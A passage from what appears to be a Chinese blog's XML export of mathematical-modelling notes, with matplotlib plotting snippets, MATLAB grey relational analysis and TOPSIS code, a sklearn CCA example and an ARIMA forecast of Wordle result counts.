显示图例  设置图例的大小和方向</span></span><br><span class="line"></span><br><span class="line">plt.yticks(fontsize=<span class="number">16</span>, color=<span class="string">&#x27;#000000&#x27;</span>)  <span class="comment"># 改变纵坐标刻度的大小</span></span><br><span class="line">plt.xticks(index_x_train + bar_width / <span class="number">2</span>, x_lable, size=<span class="number">16</span>)  </span><br><span class="line"><span class="comment"># 让横坐标轴刻度显示 x_lable中的动作类型， index_x_train + bar_width/2 为横坐标轴刻度的位置</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># plt.ylabel(&#x27; &#x27;)  # 纵坐标轴标题</span></span><br><span class="line"><span class="comment"># plt.title(&#x27; &#x27;)  # 图形标题</span></span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<h3 id="水平条形图"><a href="#水平条形图" class="headerlink" title="水平条形图"></a>水平条形图</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data=df.iloc[:, **].value_counts()</span><br><span class="line">plt.figure(num=<span class="number">2</span>,figsize=(<span class="number">7.6</span>,<span class="number">3.0</span>))</span><br><span class="line">plt.barh(data.index, width=data.values, color=(<span class="string">&quot;#FF6D60&quot;</span>, <span class="string">&quot;skyblue&quot;</span>,<span class="string">&quot;#F7D060&quot;</span></span><br><span class="line">                                               ,<span class="string">&#x27;#9376E0&#x27;</span>,<span class="string">&#x27;#FDCEDF&#x27;</span>, <span class="string">&quot;#243763&quot;</span>))</span><br><span class="line">figname = <span class="string">&quot;&quot;</span></span><br><span class="line">plt.title(figname)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">plt.savefig(<span class="string">&quot;./水平条形图/&#123;&#125;.svg&quot;</span>.<span class="built_in">format</span>(figname), dpi=<span class="number">300</span>,<span class="built_in">format</span>=<span class="string">&quot;svg&quot;</span>, bbox_inches=<span class="string">&#x27;tight&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<h3 id="散点图"><a href="#散点图" class="headerlink" title="散点图"></a>散点图</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.figure(num=<span class="number">2</span>,figsize=(<span class="number">13</span>,<span class="number">4</span>))</span><br><span class="line">plt.title(<span class="string">&#x27;Title&#x27;</span>)</span><br><span class="line">plt.scatter(<span class="built_in">range</span>(<span class="built_in">len</span>(y_test)), y_test, color=<span class="string">&quot;cornflowerblue&quot;</span>, linewidth=<span class="number">2.0</span>,linestyle=<span class="string">&quot;-&quot;</span>, label=<span class="string">&#x27;y_test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.xlabel(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<h3 id="饼状图"><a href="#饼状图" class="headerlink" title="饼状图"></a>饼状图</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data=df.iloc[:, i].value_counts()</span><br><span class="line">plt.figure(num=<span class="number">2</span>,figsize=(<span class="number">3.8</span>,<span class="number">3.8</span>))</span><br><span class="line">plt.pie(data.values,</span><br><span class="line">        labels=data.index,  <span class="comment"># 设置饼图标签</span></span><br><span class="line">        autopct=<span class="string">&quot;(%1.1f%%)&quot;</span> , <span class="comment">#饼块内标签。</span></span><br><span class="line">        colors=(<span class="string">&quot;#FF6D60&quot;</span>, <span class="string">&quot;skyblue&quot;</span>,<span class="string">&quot;#F7D060&quot;</span>,<span class="string">&#x27;#9376E0&#x27;</span>,<span class="string">&#x27;#FDCEDF&#x27;</span>),</span><br><span class="line">        )</span><br><span class="line">figname = <span class="string">&quot;问题&#123;&#125;的分布占比图&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">plt.title(figname)</span><br><span class="line">plt.savefig(<span class="string">&quot;./饼状图/&#123;&#125;.svg&quot;</span>.<span class="built_in">format</span>(figname), dpi=<span class="number">300</span>,<span class="built_in">format</span>=<span class="string">&quot;svg&quot;</span>, bbox_inches=<span class="string">&#x27;tight&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.figure(num=<span class="number">2</span>,figsize=(<span class="number">13</span>,<span class="number">4</span>))</span><br><span class="line">y = np.array([<span class="number">30</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">30</span>])</span><br><span class="line">plt.pie(y,</span><br><span class="line">        labels=[<span class="string">&#x27;Windows&#x27;</span>, <span class="string">&#x27;Linux&#x27;</span>, <span class="string">&#x27;ios&#x27;</span>, <span class="string">&#x27;Android&#x27;</span>],  <span class="comment"># 设置饼图标签</span></span><br><span class="line">        autopct=<span class="string">&quot;(%1.1f%%)&quot;</span> , <span class="comment">#饼块内标签。</span></span><br><span class="line">        colors=(<span class="string">&quot;r&quot;</span>, <span class="string">&quot;blue&quot;</span>,<span class="string">&quot;#88c999&quot;</span>, (<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>)),</span><br><span class="line">        <span class="comment">#设置各饼块的颜色，r表示red，blue代表蓝色</span></span><br><span class="line">        <span class="comment">#88c998十六进制表示绿色 （1,1,0）以元组形式表示黄色</span></span><br><span class="line">        explode=[<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>, <span class="number">0</span>] <span class="comment">#</span></span><br><span class="line">        )</span><br><span class="line">plt.title(<span class="string">&quot;操作系统使用占比&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<h3 id="折线图"><a href="#折线图" class="headerlink" title="折线图"></a>折线图</h3><h3 id="词云图"><a href="#词云图" class="headerlink" title="词云图"></a>词云图</h3><p>注意如果是中文词语，需要用jieba对句子进行分词处理。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib.font_manager <span class="keyword">import</span> FontProperties</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置中文字体路径</span></span><br><span class="line">font_path = <span class="string">&#x27;C:\Windows\Fonts\simsun.ttc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个词云对象，并设置中文字体</span></span><br><span class="line">wordcloud = WordCloud(font_path=font_path, background_color=<span class="string">&#x27;white&#x27;</span>, width=<span class="number">1000</span>,<span class="comment">#宽度</span></span><br><span class="line">                height=<span class="number">600</span>,<span class="comment">#高度</span></span><br><span class="line">                     )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文本文件并生成词云图</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;text.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    text = file.read()</span><br><span class="line">    wordcloud.generate(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示词云图</span></span><br><span class="line">plt.imshow(wordcloud, interpolation=<span class="string">&#x27;bilinear&#x27;</span>)</span><br><span class="line">plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>数学建模</tag>
        <tag>机器学习</tag>
        <tag>数据处理</tag>
      </tags>
  </entry>
  <entry>
    <title>数学建模方法</title>
    <url>/2023/03/01/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="灰色相关分析"><a href="#灰色相关分析" class="headerlink" title="灰色相关分析"></a>灰色相关分析</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>链接：<a href="https://blog.csdn.net/weixin_51545953/article/details/111029419?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167877326916800182185578%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167877326916800182185578&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-111029419-null-null.142%5Ev73%5Einsert_down2,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E7%81%B0%E8%89%B2%E5%85%B3%E8%81%94%E5%88%86%E6%9E%90">https://blog.csdn.net/weixin_51545953&#x2F;article&#x2F;details&#x2F;111029419?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%2522167877326916800182185578%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id&#x3D;167877326916800182185578&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>top_positive~default-1-111029419-null-null.142^v73^insert_down2,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term&#x3D;%E7%81%B0%E8%89%B2%E5%85%B3%E8%81%94%E5%88%86%E6%9E%90</a></p>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">%% 应用一：分析产业对GDP的影响程度</span></span><br><span class="line">clear;clc;</span><br><span class="line">load data.mat;</span><br><span class="line">r = <span class="built_in">size</span>(data,<span class="number">1</span>);</span><br><span class="line">c = <span class="built_in">size</span>(data,<span class="number">2</span>);</span><br><span class="line"><span class="comment">%第一步，对变量进行预处理，消除量纲的影响（大家在使用时需要注意自己的数据量纲是否相同）</span></span><br><span class="line"><span class="comment">%avg = repmat(mean(data),r,1);</span></span><br><span class="line"><span class="comment">%data = data./avg;</span></span><br><span class="line"><span class="comment">%定义母序列和子序列</span></span><br><span class="line">Y = data(:,<span class="number">1</span>); <span class="comment">%母序列</span></span><br><span class="line">X = data(:,<span class="number">2</span>:c); <span class="comment">%子序列</span></span><br><span class="line">Y2 = <span class="built_in">repmat</span>(Y,<span class="number">1</span>,c<span class="number">-1</span>); <span class="comment">%把母序列向右复制到c-1列</span></span><br><span class="line">absXi_Y = <span class="built_in">abs</span>(X-Y2)</span><br><span class="line">a = <span class="built_in">min</span>(<span class="built_in">min</span>(absXi_Y)) <span class="comment">%全局最小值</span></span><br><span class="line">b = <span class="built_in">max</span>(<span class="built_in">max</span>(absXi_Y)) <span class="comment">%全局最大值</span></span><br><span class="line">ro = <span class="number">0.5</span>; <span class="comment">%分辨系数取0.5</span></span><br><span class="line"><span class="built_in">gamma</span> = (a+ro*b)./(absXi_Y+ro*b) <span class="comment">%计算子序列中各个指标与母序列的关联系数</span></span><br><span class="line"><span class="built_in">disp</span>(<span class="string">&quot;子序列中各个指标的灰色关联度分别为：&quot;</span>);</span><br><span class="line"><span class="built_in">ans</span> = <span class="built_in">mean</span>(<span class="built_in">gamma</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">%应用二：灰色关联分析评价河流情况</span></span><br><span class="line">clear;clc;</span><br><span class="line">load X.mat;</span><br><span class="line"><span class="comment">%获取行数列数</span></span><br><span class="line">r = <span class="built_in">size</span>(X,<span class="number">1</span>);</span><br><span class="line">c = <span class="built_in">size</span>(X,<span class="number">2</span>);</span><br><span class="line"><span class="comment">%首先，把我们的原始指标矩阵正向化</span></span><br><span class="line"><span class="comment">%第二列中间型---&gt;极大型</span></span><br><span class="line">middle = input(<span class="string">&quot;请输入最佳的中间值：&quot;</span>);</span><br><span class="line">M = <span class="built_in">max</span>(<span class="built_in">abs</span>(X(:,<span class="number">2</span>)-middle));</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:r</span><br><span class="line">X(<span class="built_in">i</span>,<span class="number">2</span>) = <span class="number">1</span>-<span class="built_in">abs</span>(X(<span class="built_in">i</span>,<span class="number">2</span>)-middle)/M;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">%第三列极小型---&gt;极大型</span></span><br><span class="line">max_value = <span class="built_in">max</span>(X(:,<span class="number">3</span>)); </span><br><span class="line">X(:,<span class="number">3</span>) = <span class="built_in">abs</span>(X(:,<span class="number">3</span>)-max_value);</span><br><span class="line"><span class="comment">%第四列区间型---&gt;极大型</span></span><br><span class="line">a = input(<span class="string">&quot;请输入区间的下界：&quot;</span>);</span><br><span class="line">b = input(<span class="string">&quot;请输入区间的下界：&quot;</span>);</span><br><span class="line">M = <span class="built_in">max</span>(a-<span class="built_in">min</span>(X(:,<span class="number">4</span>)),<span class="built_in">max</span>(X(:,<span class="number">4</span>))-b);</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:r</span><br><span class="line"><span class="keyword">if</span> (X(<span class="built_in">i</span>,<span class="number">4</span>)&lt;a)</span><br><span class="line">X(<span class="built_in">i</span>,<span class="number">4</span>) = <span class="number">1</span>-(a-X(<span class="built_in">i</span>,<span class="number">4</span>))/M;</span><br><span class="line"><span class="keyword">elseif</span> (X(<span class="built_in">i</span>,<span class="number">4</span>)&lt;=b&amp;&amp;X(<span class="built_in">i</span>,<span class="number">4</span>)&gt;=a)</span><br><span class="line">X(<span class="built_in">i</span>,<span class="number">4</span>) = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">X(<span class="built_in">i</span>,<span class="number">4</span>) = <span class="number">1</span>-(X(<span class="built_in">i</span>,<span class="number">4</span>)-b)/M;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="built_in">disp</span>(<span class="string">&quot;正向化后的矩阵为：&quot;</span>);</span><br><span class="line"><span class="built_in">disp</span>(X);</span><br><span class="line"><span class="comment">%把正向化后的矩阵进行预处理，消除量纲的影响</span></span><br><span class="line">avg = <span class="built_in">repmat</span>(<span class="built_in">mean</span>(X),r,<span class="number">1</span>);</span><br><span class="line">new_X = X./avg;</span><br><span class="line"><span class="comment">%将预处理后的矩阵每一行的最大值取出，当成母序列(虚构的)</span></span><br><span class="line">Y = <span class="built_in">max</span>(new_X,[],<span class="number">2</span>);</span><br><span class="line"><span class="comment">%计算各个指标和母序列的灰色关联度</span></span><br><span class="line"><span class="comment">%先把new_X矩阵所有元素都减去母序列中同行的元素，并取绝对值</span></span><br><span class="line">Y2 = <span class="built_in">repmat</span>(Y,<span class="number">1</span>,c);</span><br><span class="line">new_X = <span class="built_in">abs</span>(new_X-Y2);</span><br><span class="line">a = <span class="built_in">min</span>(<span class="built_in">min</span>(new_X)); <span class="comment">%全矩阵最小值</span></span><br><span class="line">b = <span class="built_in">max</span>(<span class="built_in">max</span>(new_X)); <span class="comment">%全矩阵最大值</span></span><br><span class="line">ro = <span class="number">0.5</span>;</span><br><span class="line">new_X = (a+ro*b)./(new_X+ro*b);</span><br><span class="line"><span class="built_in">disp</span>(<span class="string">&quot;各个指标对于母序列的灰色关联度为：&quot;</span>);</span><br><span class="line"><span class="built_in">gamma</span> = <span class="built_in">mean</span>(new_X)</span><br><span class="line"><span class="comment">%计算各个指标的权重</span></span><br><span class="line"><span class="built_in">disp</span>(<span class="string">&quot;各个指标的权重为：&quot;</span>);</span><br><span class="line">weight = <span class="built_in">gamma</span>./(sum(<span class="built_in">gamma</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">%-------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">%继续TOPSIS的步骤：对正向化后的矩阵X进行标准化（原矩阵除以每一列元素平方之和的开方）</span></span><br><span class="line">temp1 = X.*X;               <span class="comment">%先让每每一个元素平方</span></span><br><span class="line">temp2 = sum(temp1);         <span class="comment">%再对每一列求和</span></span><br><span class="line">temp3 = temp2.^<span class="number">0.5</span>;         <span class="comment">%再把结果开方</span></span><br><span class="line">temp4 = <span class="built_in">repmat</span>(temp3,r,<span class="number">1</span>);  <span class="comment">%把开方后的结果按行复制r行</span></span><br><span class="line"><span class="built_in">disp</span>(<span class="string">&quot;******标准化后的矩阵为：&quot;</span>);</span><br><span class="line">Z = X./temp4               <span class="comment">%原矩阵除以每一列元素平方之和的开方</span></span><br><span class="line">Z_max = <span class="built_in">max</span>(Z)           <span class="comment">%获得Z每一列中最大的元素</span></span><br><span class="line">Z_min = <span class="built_in">min</span>(Z)           <span class="comment">%获得Z每一列中最小的元素</span></span><br><span class="line">D_max = sum(weight.*(Z-<span class="built_in">repmat</span>(Z_max,r,<span class="number">1</span>)).^<span class="number">2</span>,<span class="number">2</span>).^<span class="number">0.5</span></span><br><span class="line">D_min = sum(weight.*(Z-<span class="built_in">repmat</span>(Z_min,r,<span class="number">1</span>)).^<span class="number">2</span>,<span class="number">2</span>).^<span class="number">0.5</span></span><br><span class="line"><span class="built_in">disp</span>(<span class="string">&quot;该矩阵得分为：&quot;</span>)</span><br><span class="line">S = D_min./(D_max+D_min)</span><br><span class="line"><span class="built_in">disp</span>(<span class="string">&quot;矩阵归一化后得分为：&quot;</span>);</span><br><span class="line">S = S./(<span class="built_in">repmat</span>(sum(S),r,<span class="number">1</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="TOPSIS（优劣解距离法）"><a href="#TOPSIS（优劣解距离法）" class="headerlink" title="TOPSIS（优劣解距离法）"></a>TOPSIS（优劣解距离法）</h2><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p><a href="https://blog.csdn.net/zedkyx/article/details/125258125?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167877524316782428655159%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167877524316782428655159&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-125258125-null-null.142%5Ev73%5Einsert_down2,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E4%BC%98%E5%8A%A3%E8%A7%A3%E8%B7%9D%E7%A6%BB%E6%B3%95TOPSIS&spm=1018.2226.3001.4187">https://blog.csdn.net/zedkyx/article/details/125258125?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%2522167877524316782428655159%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id&#x3D;167877524316782428655159&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduend~default-1-125258125-null-null.142^v73^insert_down2,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term&#x3D;%E4%BC%98%E5%8A%A3%E8%A7%A3%E8%B7%9D%E7%A6%BB%E6%B3%95TOPSIS&amp;spm&#x3D;1018.2226.3001.4187</a></p>
<h2 id="典型相关分析（CCA）"><a href="#典型相关分析（CCA）" class="headerlink" title="典型相关分析（CCA）"></a>典型相关分析（CCA）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 通过sklearn工具包内置的CCA实现</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.cross_decomposition <span class="keyword">import</span> CCA</span><br><span class="line"><span class="keyword">from</span> icecream <span class="keyword">import</span> ic   <span class="comment"># ic用于显示，类似于print</span></span><br><span class="line"></span><br><span class="line">A = [[<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>)] </span><br><span class="line">B = [[<span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>)] </span><br><span class="line"><span class="comment"># 注意在A、B中的数为输入变量及输出变量参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建模</span></span><br><span class="line">cca = CCA(n_components=<span class="number">1</span>)  <span class="comment"># 若想计算第二主成分对应的相关系数，则令cca = CCA(n_components=2)</span></span><br><span class="line"><span class="comment"># 训练数据</span></span><br><span class="line">cca.fit(X, Y)</span><br><span class="line"><span class="comment"># 降维操作</span></span><br><span class="line">X_train_r, Y_train_r = cca.transform(X, Y)</span><br><span class="line"><span class="comment">#输出相关系数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ic(np.corrcoef(X_train_r[:, <span class="number">0</span>], Y_train_r[:, <span class="number">0</span>])[<span class="number">0</span>, <span class="number">1</span>])  </span><br><span class="line"><span class="comment">#如果想计算第二主成分对应的相关系数 print(np.corrcoef(X_train_r[:, 1], Y_train_r[:, 1])[0, 1])</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="时间序列"><a href="#时间序列" class="headerlink" title="时间序列"></a>时间序列</h2><h3 id="ARIMA-模型"><a href="#ARIMA-模型" class="headerlink" title="ARIMA 模型"></a>ARIMA 模型</h3><h4 id="链接-1"><a href="#链接-1" class="headerlink" title="链接"></a>链接</h4><p><a href="https://blog.csdn.net/weixin_49583390/article/details/121914303?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167879476916800197016726%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167879476916800197016726&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-121914303-null-null.142%5Ev73%5Einsert_down2,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=ARIMA">ARIMA（p,d,q）模型原理及其实现 ——–python_arima python_English Chan的博客-CSDN博客</a></p>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> stats </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line">df = pd.read_excel(<span class="string">&quot;ProblemC.xlsx&quot;</span>)</span><br><span class="line">df</span><br><span class="line"></span><br><span class="line">data = df.set_index([<span class="string">&quot;Date&quot;</span>])</span><br><span class="line">data.head()</span><br><span class="line"></span><br><span class="line">data = data[[<span class="string">&quot;Number in hard mode&quot;</span>]]</span><br><span class="line">data</span><br><span class="line"></span><br><span class="line">data.plot()</span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment">#平稳数据折线图</span></span><br><span class="line">font = &#123;<span class="string">&quot;size&quot;</span>:<span class="number">15</span>,</span><br><span class="line">    <span class="string">&quot;family&quot;</span>:<span class="string">&quot;fangsong&quot;</span>&#125;</span><br><span class="line">plt.rc(<span class="string">&quot;font&quot;</span>,**font)</span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>]=<span class="literal">False</span></span><br><span class="line">plt.figure(figsize=(<span class="number">12</span>,<span class="number">4</span>))</span><br><span class="line">plt.plot(data.values,label=<span class="string">&quot;源数据&quot;</span>)</span><br><span class="line">plt.plot([<span class="number">0</span>,<span class="number">120</span>],[<span class="number">0</span>,<span class="number">0</span>],<span class="string">&quot;--&quot;</span>,c = <span class="string">&quot;grey&quot;</span>)</span><br><span class="line">plt.xlim(<span class="number">0</span>,<span class="number">120</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">plt.figure(figsize=(<span class="number">12</span>,<span class="number">4</span>))</span><br><span class="line">plt.plot(data.diff(<span class="number">1</span>).values,c=<span class="string">&quot;darkgreen&quot;</span>,label=<span class="string">&quot;一阶差分&quot;</span>)</span><br><span class="line">plt.plot([<span class="number">0</span>,<span class="number">120</span>],[<span class="number">0</span>,<span class="number">0</span>],<span class="string">&quot;--&quot;</span>,c = <span class="string">&quot;grey&quot;</span>)</span><br><span class="line">plt.xlim(<span class="number">0</span>,<span class="number">120</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 确定p</span></span><br><span class="line"><span class="keyword">from</span> statsmodels.graphics.tsaplots <span class="keyword">import</span> plot_pacf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fig = plt.figure(figsize=(<span class="number">12</span>,<span class="number">8</span>))</span><br><span class="line">ax1 = fig.add_subplot(<span class="number">211</span>)</span><br><span class="line">plot_pacf(data.diff(<span class="number">1</span>).values[<span class="number">1</span>:], lags=<span class="number">40</span>,ax = ax1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确定q</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> statsmodels.graphics.tsaplots <span class="keyword">import</span> plot_acf</span><br><span class="line">ax2 = fig.add_subplot(<span class="number">212</span>)</span><br><span class="line"><span class="comment"># plt.figure(figsize=(12,4))</span></span><br><span class="line">plot_acf(data.diff(<span class="number">1</span>).values[<span class="number">1</span>:], lags=<span class="number">40</span>,ax = ax2)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment">#######################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据判断出来的p和q还有d建立模型(p,d,q)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拆分数据集为训练集和测试集</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line">train, test = train_test_split(data, test_size=<span class="number">0.2</span>, shuffle=<span class="literal">False</span>)</span><br><span class="line">train</span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对测试集进行预测并计算误差</span></span><br><span class="line"><span class="keyword">from</span> statsmodels.tsa.arima.model <span class="keyword">import</span> ARIMA</span><br><span class="line">history = [x <span class="keyword">for</span> x <span class="keyword">in</span> train.values]</span><br><span class="line">predictions = <span class="built_in">list</span>()</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(test)):</span><br><span class="line">    model = ARIMA(history, order=(<span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">    model_fit = model.fit()</span><br><span class="line">    output = model_fit.forecast()</span><br><span class="line">    yhat = output[<span class="number">0</span>]</span><br><span class="line">    predictions.append(yhat)</span><br><span class="line">    obs = test.values[t]</span><br><span class="line">    history.append(obs)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error</span><br><span class="line">RMSE_test = np.sqrt(mean_squared_error(test, predictions))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test RMSE: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(RMSE_test))</span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line">plt.plot(test.index, test.values, label=<span class="string">&#x27;Actual&#x27;</span>)</span><br><span class="line">plt.plot(test.index, predictions, label=<span class="string">&#x27;Predicted&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Daily Wordle Results&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Date&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Number of reported results&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment">#####################################################################</span></span><br><span class="line"><span class="comment"># 对未来数据进行预测</span></span><br><span class="line">forecast = model_fit.forecast(steps=<span class="number">30</span>)</span><br><span class="line">forecast</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>数学建模</tag>
        <tag>机器学习</tag>
        <tag>数据处理</tag>
      </tags>
  </entry>
  <entry>
    <title>数据预处理</title>
    <url>/2023/03/01/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E6%8D%AE%E9%A2%84%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h3 id="导包"><a href="#导包" class="headerlink" title="导包"></a>导包</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 支持中文</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimSun&#x27;</span>]  <span class="comment"># 用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span>  <span class="comment"># 用来正常显示负号</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.size&#x27;</span>] = <span class="number">12</span> <span class="comment"># 小四字体</span></span><br></pre></td></tr></table></figure>
